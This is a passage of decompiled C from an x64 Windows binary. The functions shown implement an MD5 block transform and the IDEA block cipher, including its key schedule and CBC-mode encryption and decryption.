      v3 -= v10;
      *v9 = 0i64;
      *(_QWORD *)(a1 + 32) = 0i64;
      *(_QWORD *)(a1 + 40) = 0i64;
      *(_QWORD *)(a1 + 48) = 0i64;
      *(_QWORD *)(a1 + 56) = 0i64;
      *(_QWORD *)(a1 + 64) = 0i64;
      *(_QWORD *)(a1 + 72) = 0i64;
      *(_QWORD *)(a1 + 80) = 0i64;
    }
    if ( v3 >> 6 )
    {
      sub_140088710((int *)a1, v4, v3 >> 6);
      v11 = v3 >> 6 << 6;
      v4 += v11;
      v3 -= v11;
    }
    if ( v3 )
    {
      *(_DWORD *)(a1 + 88) = v3;
      memmove((void *)(a1 + 24), v4, v3);
    }
  }
  return 1i64;
}

//----- (0000000140088710) ----------------------------------------------------
void __fastcall sub_140088710(int *a1, unsigned __int8 *a2, __int64 a3)
{
  int v3; // ebx
  __int64 v4; // rax
  int v5; // r11d
  int v6; // r10d
  int v7; // edi
  int v8; // ecx
  int v9; // r8d
  int v10; // r9d
  int v11; // r10d
  int v12; // r11d
  int v13; // ecx
  int v14; // r13d
  int v15; // r8d
  int v16; // r9d
  int v17; // r10d
  int v18; // r12d
  int v19; // r11d
  int v20; // ecx
  int v21; // r14d
  int v22; // r15d
  int v23; // esi
  int v24; // ebp
  int v25; // eax
  int v26; // r8d
  int v27; // r15d
  int v28; // r9d
  int v29; // esi
  int v30; // r10d
  int v31; // ebp
  int v32; // ecx
  int v33; // r8d
  int v34; // r9d
  int v35; // r10d
  int v36; // r11d
  int v37; // ecx
  int v38; // r8d
  int v39; // r9d
  int v40; // r10d
  int v41; // r11d
  int v42; // ecx
  int v43; // r8d
  int v44; // ebx
  int v45; // edi
  int v46; // r9d
  int v47; // r10d
  int v48; // r11d
  int v49; // r8d
  int v50; // r9d
  int v51; // r10d
  int v52; // r11d
  int v53; // r8d
  int v54; // r9d
  int v55; // r10d
  int v56; // r11d
  int v57; // r8d
  int v58; // r9d
  int v59; // r10d
  int v60; // r11d
  int v61; // r8d
  int v62; // ecx
  int v63; // r9d
  int v64; // r10d
  int v65; // r11d
  int v66; // r8d
  int v67; // ecx
  int v68; // r9d
  int v69; // r10d
  int v70; // r11d
  int v71; // r8d
  int v72; // ecx
  int v73; // r9d
  int v74; // r10d
  int v75; // r11d
  int v76; // r8d
  int v77; // ecx
  int v78; // r10d
  int v79; // r9d
  int v80; // r8d
  int v81; // [rsp+0h] [rbp-78h]
  int v82; // [rsp+4h] [rbp-74h]
  int v83; // [rsp+8h] [rbp-70h]
  int v84; // [rsp+Ch] [rbp-6Ch]
  int v85; // [rsp+10h] [rbp-68h]
  int v86; // [rsp+14h] [rbp-64h]
  int v87; // [rsp+18h] [rbp-60h]
  int v88; // [rsp+1Ch] [rbp-5Ch]
  int v89; // [rsp+20h] [rbp-58h]
  int v90; // [rsp+24h] [rbp-54h]
  int v91; // [rsp+28h] [rbp-50h]
  int v93; // [rsp+88h] [rbp+10h]
  __int64 v94; // [rsp+90h] [rbp+18h]
  int v95; // [rsp+98h] [rbp+20h]

  if ( a3 )
  {
    v3 = a1[1];
    v4 = a3;
    v5 = a1[2];
    v6 = a1[3];
    v7 = *a1;
    v87 = v3;
    v88 = v5;
    v89 = v6;
    do
    {
      v94 = v4 - 1;
      v93 = (a2[3] << 24) | (a2[2] << 16) | (a2[1] << 8) | *a2;
      v82 = (a2[7] << 24) | (a2[6] << 16) | *((unsigned __int16 *)a2 + 2);
      v8 = v3 + __ROL4__(v7 + (v6 ^ v3 & (v5 ^ v6)) - 680876936 + v93, 7);
      v85 = (a2[11] << 24) | (a2[10] << 16) | (a2[9] << 8) | a2[8];
      v9 = v8 + __ROL4__(v82 + (v5 ^ v8 & (v3 ^ v5)) + v6 - 389564586, 12);
      v81 = (a2[15] << 24) | (a2[14] << 16) | *((unsigned __int16 *)a2 + 6);
      v10 = v9 + __ROL4__(v85 + (v3 ^ v9 & (v8 ^ v3)) + v5 + 606105819, 17);
      v84 = (a2[19] << 24) | (a2[18] << 16) | *((unsigned __int16 *)a2 + 8);
      v11 = v10 + __ROL4__(v3 + (v8 ^ v10 & (v8 ^ v9)) - 1044525330 + v81, 22);
      v95 = (a2[23] << 24) | (a2[22] << 16) | *((unsigned __int16 *)a2 + 10);
      v12 = v11 + __ROL4__(v84 + (v9 ^ v11 & (v10 ^ v9)) + v8 - 176418897, 7);
      v83 = (a2[27] << 24) | (a2[26] << 16) | (a2[25] << 8) | a2[24];
      v13 = v12 + __ROL4__(v9 + v95 + (v10 ^ v12 & (v11 ^ v10)) + 1200080426, 12);
      v14 = (a2[31] << 24) | (a2[30] << 16) | *((unsigned __int16 *)a2 + 14);
      v15 = v13 + __ROL4__(v10 + v83 + (v11 ^ v13 & (v12 ^ v11)) - 1473231341, 17);
      v90 = (a2[35] << 24) | (a2[34] << 16) | *((unsigned __int16 *)a2 + 16);
      v16 = v15 + __ROL4__(v14 + (v12 ^ v15 & (v12 ^ v13)) + v11 - 45705983, 22);
      v86 = (a2[39] << 24) | (a2[38] << 16) | (a2[37] << 8) | a2[36];
      v17 = v16 + __ROL4__(v90 + (v13 ^ v16 & (v15 ^ v13)) + v12 + 1770035416, 7);
      v18 = (a2[43] << 24) | (a2[42] << 16) | (a2[41] << 8) | a2[40];
      v19 = v17 + __ROL4__(v86 + (v15 ^ v17 & (v16 ^ v15)) + v13 - 1958414417, 12);
      v91 = (a2[47] << 24) | (a2[46] << 16) | *((unsigned __int16 *)a2 + 22);
      v20 = v19 + __ROL4__(v18 + (v16 ^ v19 & (v17 ^ v16)) + v15 - 42063, 17);
      v21 = (a2[51] << 24) | (a2[50] << 16) | (a2[49] << 8) | a2[48];
      v22 = a2[52];
      v23 = a2[56];
      v24 = a2[60];
      v25 = a2[53];
      a2 += 64;
      v26 = v20 + __ROL4__(v91 + (v17 ^ v20 & (v17 ^ v19)) + v16 - 1990404162, 22);
      v27 = (*(a2 - 9) << 24) | (*(a2 - 10) << 16) | (v25 << 8) | v22;
      v28 = v26 + __ROL4__(v21 + (v19 ^ v26 & (v20 ^ v19)) + v17 + 1804603682, 7);
      v29 = (*(a2 - 5) << 24) | (*(a2 - 6) << 16) | (*(a2 - 7) << 8) | v23;
      v30 = v28 + __ROL4__(v19 + v27 + (v20 ^ v28 & (v26 ^ v20)) - 40341101, 12);
      v31 = (*(a2 - 1) << 24) | (*(a2 - 2) << 16) | (*(a2 - 3) << 8) | v24;
      v32 = v30 + __ROL4__(v29 + (v26 ^ v30 & (v28 ^ v26)) - 1502002290 + v20, 17);
      v33 = v32 + __ROL4__(v31 + (v28 ^ v32 & (v28 ^ v30)) + 1236535329 + v26, 22);
      v34 = v33 + __ROL4__(v82 + (v32 ^ v30 & (v33 ^ v32)) - 165796510 + v28, 5);
      v35 = v34 + __ROL4__(v83 + (v33 ^ v32 & (v34 ^ v33)) - 1069501632 + v30, 9);
      v36 = v35 + __ROL4__(v91 + (v34 ^ v33 & (v34 ^ v35)) + v32 + 643717713, 14);
      v37 = v36 + __ROL4__(v93 + (v35 ^ v34 & (v36 ^ v35)) + v33 - 373897302, 20);
      v38 = v37 + __ROL4__(v95 + (v36 ^ v35 & (v37 ^ v36)) + v34 - 701558691, 5);
      v39 = v38 + __ROL4__(v18 + (v37 ^ v36 & (v38 ^ v37)) + v35 + 38016083, 9);
      v40 = v39 + __ROL4__(v31 + (v38 ^ v37 & (v38 ^ v39)) + v36 - 660478335, 14);
      v41 = v40 + __ROL4__(v84 + (v39 ^ v38 & (v40 ^ v39)) + v37 - 405537848, 20);
      v42 = v41 + __ROL4__(v86 + (v40 ^ v39 & (v41 ^ v40)) + v38 + 568446438, 5);
      v43 = v42 + __ROL4__(v29 + (v41 ^ v40 & (v42 ^ v41)) + v39 - 1019803690, 9);
      v44 = v43 + __ROL4__(v81 + (v42 ^ v41 & (v42 ^ v43)) + v40 - 187363961, 14);
      v45 = v44 + __ROL4__(v90 + (v43 ^ v42 & (v44 ^ v43)) + v41 + 1163531501, 20);
      v46 = v45 + __ROL4__(v27 + (v44 ^ v43 & (v45 ^ v44)) + v42 - 1444681467, 5);
      v47 = v46 + __ROL4__(v85 + (v45 ^ v44 & (v46 ^ v45)) + v43 - 51403784, 9);
      v48 = v47 + __ROL4__(v14 + (v46 ^ v45 & (v46 ^ v47)) + v44 + 1735328473, 14);
      v49 = v48 + __ROL4__(v45 + v21 + (v47 ^ v46 & (v48 ^ v47)) - 1926607734, 20);
      v50 = v49 + __ROL4__(v95 + (v49 ^ v48 ^ v47) - 378558 + v46, 4);
      v51 = v50 + __ROL4__(v90 + (v50 ^ v49 ^ v48) - 2022574463 + v47, 11);
      v52 = v51 + __ROL4__(v91 + (v50 ^ v49 ^ v51) + 1839030562 + v48, 16);
      v53 = v52 + __ROL4__(v29 + (v50 ^ v52 ^ v51) - 35309556 + v49, 23);
      v54 = v53 + __ROL4__(v82 + (v53 ^ v52 ^ v51) - 1530992060 + v50, 4);
      v55 = v54 + __ROL4__(v84 + (v54 ^ v53 ^ v52) + 1272893353 + v51, 11);
      v56 = v55 + __ROL4__(v14 + (v54 ^ v53 ^ v55) - 155497632 + v52, 16);
      v57 = v56 + __ROL4__(v18 + (v54 ^ v56 ^ v55) - 1094730640 + v53, 23);
      v58 = v57 + __ROL4__(v27 + (v57 ^ v56 ^ v55) + 681279174 + v54, 4);
      v59 = v58 + __ROL4__(v93 + (v58 ^ v57 ^ v56) - 358537222 + v55, 11);
      v60 = v59 + __ROL4__(v81 + (v58 ^ v57 ^ v59) - 722521979 + v56, 16);
      v61 = v60 + __ROL4__(v83 + (v58 ^ v60 ^ v59) + 76029189 + v57, 23);
      v62 = v61 + __ROL4__(v58 - 640364487 + v86 + (v61 ^ v60 ^ v59), 4);
      v63 = v62 + __ROL4__(v21 + (v62 ^ v61 ^ v60) + v59 - 421815835, 11);
      v64 = v63 + __ROL4__(v31 + (v62 ^ v61 ^ v63) + v60 + 530742520, 16);
      v65 = v64 + __ROL4__(v85 + (v62 ^ v64 ^ v63) + v61 - 995338651, 23);
      v66 = v65 + __ROL4__(v93 + (v64 ^ (v65 | ~v63)) + v62 - 198630844, 6);
      v67 = v66 + __ROL4__(v14 + (v65 ^ (v66 | ~v64)) + v63 + 1126891415, 10);
      v68 = v67 + __ROL4__(v29 + (v66 ^ (v67 | ~v65)) + v64 - 1416354905, 15);
      v69 = v68 + __ROL4__(v95 + (v67 ^ (v68 | ~v66)) + v65 - 57434055, 21);
      v70 = v69 + __ROL4__(v21 + (v68 ^ (v69 | ~v67)) + v66 + 1700485571, 6);
      v71 = v70 + __ROL4__(v81 + (v69 ^ (v70 | ~v68)) + v67 - 1894986606, 10);
      v72 = v71 + __ROL4__(v18 + (v70 ^ (v71 | ~v69)) + v68 - 1051523, 15);
      v73 = v72 + __ROL4__(v82 + (v71 ^ (v72 | ~v70)) + v69 - 2054922799, 21);
      v74 = v73 + __ROL4__(v90 + (v72 ^ (v73 | ~v71)) + v70 + 1873313359, 6);
      v75 = v74 + __ROL4__(v31 + (v73 ^ (v74 | ~v72)) + v71 - 30611744, 10);
      v76 = v75 + __ROL4__(v83 + (v74 ^ (v75 | ~v73)) + v72 - 1560198380, 15);
      v77 = v76 + __ROL4__(v27 + (v75 ^ (v76 | ~v74)) + v73 + 1309151649, 21);
      v78 = v77 + __ROL4__(v84 + (v76 ^ (v77 | ~v75)) - 145523070 + v74, 6);
      v79 = v78 + __ROL4__(v75 + v91 - 1120210379 + (v77 ^ (v78 | ~v76)), 10);
      v80 = v79 + __ROL4__(v85 + (v78 ^ (v79 | ~v77)) + 718787259 + v76, 15);
      *a1 += v78;
      v7 = *a1;
      v3 = v80 + __ROL4__(v86 + (v79 ^ (v80 | ~v78)) - 343485551 + v77, 21) + v87;
      a1[1] = v3;
      a1[2] = v80 + v88;
      v5 = v80 + v88;
      v88 += v80;
      v87 = v3;
      a1[3] = v79 + v89;
      v6 = v79 + v89;
      v4 = v94;
      v89 += v79;
    }
    while ( v94 );
  }
}

//----- (00000001400891A0) ----------------------------------------------------
__int64 __fastcall sub_1400891A0(__int64 a1, _BYTE *a2, _DWORD *a3)
{
  int v5; // edx
  unsigned int v6; // r9d
  int v7; // eax
  int v8; // ecx
  int v9; // ecx
  char v10; // al
  int v11; // ecx
  __int64 result; // rax
  int v13; // [rsp+30h] [rbp+8h] BYREF
  int v14; // [rsp+34h] [rbp+Ch]

  v5 = *(unsigned __int8 *)(a1 + 4) << 24;
  v6 = _byteswap_ulong(*(_DWORD *)a1);
  v7 = *(unsigned __int8 *)(a1 + 5);
  v8 = *(unsigned __int8 *)(a1 + 6) << 8;
  v13 = v6;
  v14 = (v7 << 16) | v5 | *(unsigned __int8 *)(a1 + 7) | v8;
  sub_140089A90(&v13, a3);
  v9 = v13;
  *a2 = HIBYTE(v13);
  a2[1] = BYTE2(v9);
  v10 = v13;
  a2[2] = BYTE1(v9);
  v11 = v14;
  a2[3] = v10;
  a2[4] = HIBYTE(v11);
  a2[5] = BYTE2(v11);
  result = (unsigned __int8)v14;
  a2[6] = BYTE1(v11);
  a2[7] = result;
  return result;
}

//----- (0000000140089260) ----------------------------------------------------
__int64 __fastcall sub_140089260(__int64 a1, int *a2)
{
  __int64 v2; // rbx
  int *v3; // r8
  int i; // esi
  int v5; // r10d
  int v6; // eax
  int v7; // edi
  int v8; // r11d
  int j; // r9d
  int v10; // ecx
  int v11; // eax
  int v12; // ecx
  int v13; // r9d
  int v14; // r10d
  int v15; // eax
  int v16; // edi
  int v17; // r11d
  int k; // r9d
  int v19; // ecx
  int v20; // eax
  int v21; // ecx
  int v22; // r9d
  int v23; // eax
  int v24; // ecx
  __int64 result; // rax
  int v26; // ecx

  v2 = a1 + 192;
  v3 = a2;
  for ( i = 0; i < 9; ++i )
  {
    v5 = *(_DWORD *)v2;
    if ( *(_DWORD *)v2 )
    {
      v7 = 0;
      v8 = 65537;
      for ( j = 1; ; j = v13 - v11 )
      {
        v10 = v8 % v5;
        if ( !(v8 % v5) )
          break;
        v11 = j * ((v8 - v8 % v5) / v5);
        v8 = v5;
        v5 = v10;
        v12 = j;
        v13 = v7;
        v7 = v12;
      }
      v6 = j + 65537;
      if ( j >= 0 )
        v6 = j;
    }
    else
    {
      v6 = 0;
    }
    *v3 = v6;
    v3[1] = (unsigned __int16)-*(_WORD *)(v2 + 8);
    v3[2] = (unsigned __int16)-*(_WORD *)(v2 + 4);
    v14 = *(_DWORD *)(v2 + 12);
    if ( v14 )
    {
      v16 = 0;
      v17 = 65537;
      for ( k = 1; ; k = v22 - v20 )
      {
        v19 = v17 % v14;
        if ( !(v17 % v14) )
          break;
        v20 = k * ((v17 - v17 % v14) / v14);
        v17 = v14;
        v14 = v19;
        v21 = k;
        v22 = v16;
        v16 = v21;
      }
      v15 = k + 65537;
      if ( k >= 0 )
        v15 = k;
    }
    else
    {
      v15 = 0;
    }
    v3[3] = v15;
    if ( i == 8 )
      break;
    v23 = *(_DWORD *)(v2 - 8);
    v2 -= 24i64;
    v3[4] = v23;
    v3[5] = *(_DWORD *)(v2 + 20);
    v3 += 6;
  }
  v24 = a2[1];
  a2[1] = a2[2];
  result = (unsigned int)a2[50];
  a2[2] = v24;
  v26 = a2[49];
  a2[49] = result;
  a2[50] = v26;
  return result;
}

//----- (00000001400893B0) ----------------------------------------------------
_DWORD *__fastcall sub_1400893B0(unsigned __int8 *a1, _DWORD *a2)
{
  _DWORD *v2; // r10
  int v4; // ecx
  int v5; // ebx
  _DWORD *result; // rax
  unsigned int v7; // r11d
  __int16 v8; // r8
  int v9; // r9d
  __int16 v10; // dx
  __int16 v11; // r8
  __int16 v12; // dx
  unsigned int v13; // r8d
  unsigned int v14; // edx

  v2 = a2 + 2;
  *a2 = *a1 << 8;
  *a2 |= a1[1];
  a2[1] = a1[2] << 8;
  a2[1] |= a1[3];
  a2[2] = a1[4] << 8;
  a2[2] |= a1[5];
  a2[3] = a1[6] << 8;
  a2[3] |= a1[7];
  a2[4] = a1[8] << 8;
  a2[4] |= a1[9];
  a2[5] = a1[10] << 8;
  a2[5] |= a1[11];
  a2[6] = a1[12] << 8;
  a2[6] |= a1[13];
  v4 = a1[14] << 8;
  a2[7] = v4;
  a2[7] = v4 | a1[15];
  v5 = 0;
  result = a2 + 8;
  do
  {
    v7 = *(v2 - 1);
    v8 = (unsigned __int16)*v2 << 9;
    *result = (unsigned __int16)(((_WORD)v7 << 9) | (*v2 >> 7));
    v9 = v2[1] << 9;
    result[1] = (unsigned __int16)(v8 | (v2[1] >> 7));
    v10 = (unsigned __int16)v2[2] << 9;
    result[2] = (unsigned __int16)((v2[2] >> 7) | v9);
    v11 = (unsigned __int16)v2[3] << 9;
    result[3] = (unsigned __int16)(v10 | (v2[3] >> 7));
    v12 = (unsigned __int16)v2[4] << 9;
    result[4] = (unsigned __int16)((v2[4] >> 7) | v11);
    v13 = v2[5];
    result[5] = (unsigned __int16)(v12 | (v13 >> 7));
    v14 = *(v2 - 2);
    if ( v5 >= 5 )
      break;
    v2 += 8;
    ++v5;
    result[6] = (unsigned __int16)((v14 >> 7) | ((_WORD)v13 << 9));
    result[7] = (unsigned __int16)((v7 >> 7) | ((_WORD)v14 << 9));
    result += 8;
  }
  while ( v5 < 6 );
  return result;
}

//----- (0000000140089520) ----------------------------------------------------
__int64 __fastcall sub_140089520(__int64 a1, _BYTE *a2, unsigned int a3, _DWORD *a4, unsigned int *a5, int a6)
{
  unsigned int *v9; // rdi
  unsigned int v10; // esi
  unsigned int v11; // r10d
  unsigned int v12; // r8d
  unsigned __int64 v13; // r15
  int v14; // ecx
  int v15; // ecx
  __int64 v16; // r14
  int v17; // ecx
  int v18; // edx
  int v19; // eax
  int v20; // eax
  int v21; // eax
  int v22; // eax
  int v23; // eax
  __int64 result; // rax
  unsigned int *v25; // r15
  int v26; // edi
  unsigned int v27; // r12d
  unsigned int v28; // r13d
  unsigned __int64 v29; // r15
  unsigned int v30; // esi
  int v31; // edi
  int v32; // edi
  int v33; // ecx
  int v34; // edx
  char v35; // eax^3
  int v36; // ecx
  unsigned int v37; // esi
  int v38; // edx
  int v39; // edx
  int v40; // r8d
  _BYTE *v41; // rbx
  unsigned int v42; // [rsp+20h] [rbp-10h] BYREF
  unsigned int v43; // [rsp+24h] [rbp-Ch]
  unsigned int *v44; // [rsp+28h] [rbp-8h]
  _DWORD *v45; // [rsp+78h] [rbp+48h]
  int v46; // [rsp+88h] [rbp+58h]
  int v47; // [rsp+88h] [rbp+58h]

  v45 = a4;
  if ( a6 )
  {
    v9 = a5;
    v10 = a3 - 8;
    v44 = a5;
    v11 = _byteswap_ulong(*a5);
    v12 = _byteswap_ulong(a5[1]);
    if ( (int)(a3 - 8) >= 0 )
    {
      v13 = (unsigned __int64)(v10 + 8) >> 3;
      v10 -= 8 * ((v10 + 8) >> 3);
      do
      {
        v14 = (*(unsigned __int8 *)(a1 + 5) << 16) | (*(unsigned __int8 *)(a1 + 4) << 24);
        v42 = v11 ^ _byteswap_ulong(*(_DWORD *)a1);
        v15 = *(unsigned __int8 *)(a1 + 7) | (*(unsigned __int8 *)(a1 + 6) << 8) | v14;
        a1 += 8i64;
        v43 = v12 ^ v15;
        sub_140089A90((int *)&v42, v45);
        v11 = v42;
        v12 = v43;
        *a2 = HIBYTE(v42);
        a2[1] = BYTE2(v11);
        a2[2] = BYTE1(v11);
        a2[3] = v11;
        a2[4] = HIBYTE(v12);
        a2[5] = BYTE2(v12);
        a2[6] = BYTE1(v12);
        a2[7] = v12;
        a2 += 8;
        --v13;
      }
      while ( v13 );
      v9 = v44;
    }
    if ( v10 != -8 )
    {
      v16 = (int)(v10 + 8) + a1;
      v17 = 0;
      v18 = 0;
      switch ( v10 )
      {
        case 0xFFFFFFF9:
          goto LABEL_15;
        case 0xFFFFFFFA:
          goto LABEL_14;
        case 0xFFFFFFFB:
          goto LABEL_13;
        case 0xFFFFFFFC:
          goto LABEL_12;
        case 0xFFFFFFFD:
          goto LABEL_11;
        case 0xFFFFFFFE:
          goto LABEL_10;
        case 0xFFFFFFFF:
          goto LABEL_9;
        case 0u:
          v17 = *(unsigned __int8 *)--v16;
LABEL_9:
          v19 = *(unsigned __int8 *)--v16;
          v17 |= v19 << 8;
LABEL_10:
          v20 = *(unsigned __int8 *)--v16;
          v17 |= v20 << 16;
LABEL_11:
          v21 = *(unsigned __int8 *)--v16;
          v17 |= v21 << 24;
LABEL_12:
          v18 = *(unsigned __int8 *)--v16;
LABEL_13:
          v22 = *(unsigned __int8 *)--v16;
          v18 |= v22 << 8;
LABEL_14:
          v23 = *(unsigned __int8 *)--v16;
          v18 |= v23 << 16;
LABEL_15:
          v18 |= *(unsigned __int8 *)(v16 - 1) << 24;
          break;
        default:
          break;
      }
      v42 = v11 ^ v18;
      v43 = v12 ^ v17;
      sub_140089A90((int *)&v42, v45);
      v11 = v42;
      v12 = v43;
      *a2 = HIBYTE(v42);
      a2[1] = BYTE2(v11);
      a2[2] = BYTE1(v11);
      a2[3] = v11;
      a2[4] = HIBYTE(v12);
      a2[5] = BYTE2(v12);
      a2[6] = BYTE1(v12);
      a2[7] = v12;
    }
    *(_BYTE *)v9 = HIBYTE(v11);
    *((_BYTE *)v9 + 1) = BYTE2(v11);
    *((_BYTE *)v9 + 2) = BYTE1(v11);
    *((_BYTE *)v9 + 3) = v11;
    *((_BYTE *)v9 + 4) = HIBYTE(v12);
    *((_BYTE *)v9 + 5) = BYTE2(v12);
    result = v12 >> 8;
    *((_BYTE *)v9 + 6) = BYTE1(v12);
    *((_BYTE *)v9 + 7) = v12;
  }
  else
  {
    v25 = a5;
    v26 = a3 - 8;
    v44 = a5;
    v27 = _byteswap_ulong(*a5);
    v28 = _byteswap_ulong(a5[1]);
    if ( (int)(a3 - 8) >= 0 )
    {
      v29 = (unsigned __int64)a3 >> 3;
      v46 = a3 - 8 - 8 * (a3 >> 3);
      do
      {
        v30 = _byteswap_ulong(*(_DWORD *)a1);
        v31 = (*(unsigned __int8 *)(a1 + 5) << 16) | (*(unsigned __int8 *)(a1 + 4) << 24);
        v42 = v30;
        v32 = *(unsigned __int8 *)(a1 + 7) | (*(unsigned __int8 *)(a1 + 6) << 8) | v31;
        a1 += 8i64;
        v43 = v32;
        sub_140089A90((int *)&v42, a4);
        v33 = v27 ^ v42;
        a4 = v45;
        v34 = v28 ^ v43;
        v35 = HIBYTE(v27) ^ HIBYTE(v42);
        v27 = v30;
        v28 = v32;
        *a2 = v35;
        a2[1] = BYTE2(v33);
        a2[2] = BYTE1(v33);
        a2[3] = v33;
        a2[4] = HIBYTE(v34);
        a2[5] = BYTE2(v34);
        a2[6] = BYTE1(v34);
        a2[7] = v34;
        a2 += 8;
        --v29;
      }
      while ( v29 );
      v25 = v44;
      v26 = v46;
    }
    if ( v26 != -8 )
    {
      v36 = *(unsigned __int8 *)(a1 + 6) << 8;
      v37 = _byteswap_ulong(*(_DWORD *)a1);
      v38 = (*(unsigned __int8 *)(a1 + 5) << 16) | (*(unsigned __int8 *)(a1 + 4) << 24);
      v42 = v37;
      v47 = *(unsigned __int8 *)(a1 + 7) | v36 | v38;
      v43 = v47;
      sub_140089A90((int *)&v42, a4);
      v39 = v27 ^ v42;
      v40 = v28 ^ v43;
      v41 = &a2[v26 + 8];
      switch ( v26 )
      {
        case -7:
          goto LABEL_31;
        case -6:
          goto LABEL_30;
        case -5:
          goto LABEL_29;
        case -4:
          goto LABEL_28;
        case -3:
          goto LABEL_27;
        case -2:
          goto LABEL_26;
        case -1:
          goto LABEL_25;
        case 0:
          *--v41 = v40;
LABEL_25:
          *--v41 = BYTE1(v40);
LABEL_26:
          *--v41 = BYTE2(v40);
LABEL_27:
          *--v41 = HIBYTE(v40);
LABEL_28:
          *--v41 = v39;
LABEL_29:
          *--v41 = BYTE1(v39);
LABEL_30:
          *--v41 = BYTE2(v39);
LABEL_31:
          *(v41 - 1) = HIBYTE(v39);
          break;
        default:
          break;
      }
      v28 = v47;
      v27 = v37;
    }
    *(_BYTE *)v25 = HIBYTE(v27);
    *((_BYTE *)v25 + 1) = BYTE2(v27);
    *((_BYTE *)v25 + 2) = BYTE1(v27);
    *((_BYTE *)v25 + 3) = v27;
    *((_BYTE *)v25 + 4) = HIBYTE(v28);
    *((_BYTE *)v25 + 5) = BYTE2(v28);
    result = v28 >> 8;
    *((_BYTE *)v25 + 6) = BYTE1(v28);
    *((_BYTE *)v25 + 7) = v28;
  }
  return result;
}

//----- (0000000140089A90) ----------------------------------------------------
__int64 __fastcall sub_140089A90(int *a1, _DWORD *a2)
{
  unsigned int v2; // eax
  unsigned int v3; // r8d
  unsigned int v4; // r10d
  int v5; // edi
  int v6; // r11d
  __int16 v7; // r10
  int v8; // ebx
  unsigned int v9; // r8d
  unsigned int v10; // r9d
  __int16 v11; // r9
  int v12; // r11d
  unsigned int v13; // r8d
  unsigned int v14; // r8d
  unsigned int v15; // eax
  unsigned int v16; // r11d
  unsigned int v17; // r11d
  unsigned int v18; // r11d
  unsigned int v19; // r8d
  unsigned __int16 v20; // r9
  int v21; // r8d
  int v22; // edi
  unsigned int v23; // eax
  int v24; // ebx
  unsigned int v25; // r11d
  __int16 v26; // r11
  int v27; // edi
  int v28; // r8d
  unsigned int v29; // r9d
  unsigned int v30; // r10d
  __int16 v31; // r10
  unsigned int v32; // eax
  unsigned int v33; // r9d
  unsigned int v34; // r9d
  unsigned int v35; // r9d
  unsigned int v36; // eax
  unsigned int v37; // ebx
  unsigned int v38; // ebx
  unsigned int v39; // ebx
  unsigned int v40; // r9d
  unsigned __int16 v41; // r10
  int v42; // r9d
  int v43; // edi
  unsigned int v44; // eax
  int v45; // ebx
  unsigned int v46; // r11d
  __int16 v47; // r11
  int v48; // edi
  int v49; // r9d
  unsigned int v50; // r8d
  unsigned int v51; // r10d
  __int16 v52; // r10
  unsigned int v53; // eax
  unsigned int v54; // r8d
  unsigned int v55; // r8d
  unsigned int v56; // r8d
  unsigned int v57; // eax
  unsigned int v58; // ebx
  unsigned int v59; // ebx
  unsigned int v60; // ebx
  unsigned int v61; // r8d
  unsigned __int16 v62; // r10
  int v63; // r8d
  int v64; // edi
  unsigned int v65; // eax
  int v66; // ebx
  unsigned int v67; // r11d
  __int16 v68; // r11
  int v69; // edi
  int v70; // r8d
  unsigned int v71; // r9d
  unsigned int v72; // r10d
  __int16 v73; // r10
  unsigned int v74; // eax
  unsigned int v75; // r9d
  unsigned int v76; // r9d
  unsigned int v77; // r9d
  unsigned int v78; // eax
  unsigned int v79; // ebx
  unsigned int v80; // ebx
  unsigned int v81; // ebx
  unsigned int v82; // r9d
  unsigned __int16 v83; // r10
  int v84; // r9d
  int v85; // edi
  unsigned int v86; // eax
  int v87; // ebx
  unsigned int v88; // r11d
  __int16 v89; // r11
  int v90; // edi
  int v91; // r9d
  unsigned int v92; // r8d
  unsigned int v93; // r10d
  __int16 v94; // r10
  unsigned int v95; // eax
  unsigned int v96; // r8d
  unsigned int v97; // r8d
  unsigned int v98; // r8d
  unsigned int v99; // eax
  unsigned int v100; // ebx
  unsigned int v101; // ebx
  unsigned int v102; // ebx
  unsigned int v103; // r8d
  unsigned __int16 v104; // r10
  int v105; // r8d
  int v106; // edi
  unsigned int v107; // eax
  int v108; // ebx
  unsigned int v109; // r11d
  __int16 v110; // r11
  int v111; // edi
  int v112; // r8d
  unsigned int v113; // r9d
  unsigned int v114; // r10d
  __int16 v115; // r10
  unsigned int v116; // eax
  unsigned int v117; // r9d
  unsigned int v118; // r9d
  unsigned int v119; // r9d
  unsigned int v120; // eax
  unsigned int v121; // ebx
  unsigned int v122; // ebx
  unsigned int v123; // ebx
  unsigned int v124; // r9d
  unsigned __int16 v125; // r10
  int v126; // r9d
  int v127; // edi
  unsigned int v128; // eax
  int v129; // ebx
  unsigned int v130; // r11d
  __int16 v131; // r11
  int v132; // edi
  int v133; // r9d
  unsigned int v134; // r8d
  unsigned int v135; // r10d
  __int16 v136; // r10
  unsigned int v137; // eax
  unsigned int v138; // r8d
  unsigned int v139; // r8d
  unsigned int v140; // r8d
  unsigned int v141; // eax
  unsigned int v142; // ebx
  unsigned int v143; // ebx
  unsigned int v144; // ebx
  unsigned int v145; // r8d
  unsigned __int16 v146; // r10
  int v147; // r8d
  int v148; // edi
  unsigned int v149; // eax
  unsigned int v150; // r9d
  unsigned int v151; // r11d
  __int16 v152; // r11
  int v153; // edi
  int v154; // r8d
  unsigned int v155; // r9d
  unsigned int v156; // r10d
  __int16 v157; // r10
  unsigned int v158; // eax
  unsigned int v159; // r9d
  unsigned int v160; // r9d
  unsigned int v161; // r9d
  unsigned int v162; // eax
  unsigned int v163; // ebx
  unsigned int v164; // ebx
  unsigned int v165; // ebx
  unsigned int v166; // r9d
  unsigned __int16 v167; // r10
  int v168; // r9d
  int v169; // edi
  unsigned int v170; // eax
  unsigned int v171; // r8d
  unsigned int v172; // r8d
  unsigned int v173; // r8d
  int v174; // r11d
  unsigned int v175; // eax
  int v176; // r10d
  int v177; // r9d
  unsigned int v178; // edx
  __int64 result; // rax

  v2 = HIWORD(*a1);
  v3 = v2 * *a2;
  if ( v3 )
  {
    v4 = (unsigned __int16)v3 - HIWORD(v3);
    v2 = HIWORD(v4);
  }
  else
  {
    LOWORD(v4) = 1 - *a2;
  }
  v5 = a2[1] + *a1;
  v6 = a2[3];
  v7 = v4 - v2;
  v8 = a2[2] + HIWORD(a1[1]);
  LOWORD(v2) = a1[1];
  v9 = (unsigned __int16)v2 * v6;
  if ( v9 )
  {
    v10 = (unsigned __int16)v9 - HIWORD(v9);
    v2 = HIWORD(v10);
  }
  else
  {
    LOWORD(v10) = 1 - v6;
  }
  v11 = v10 - v2;
  v12 = (unsigned __int16)(v7 ^ v8);
  v13 = v12 * a2[4];
  if ( v13 )
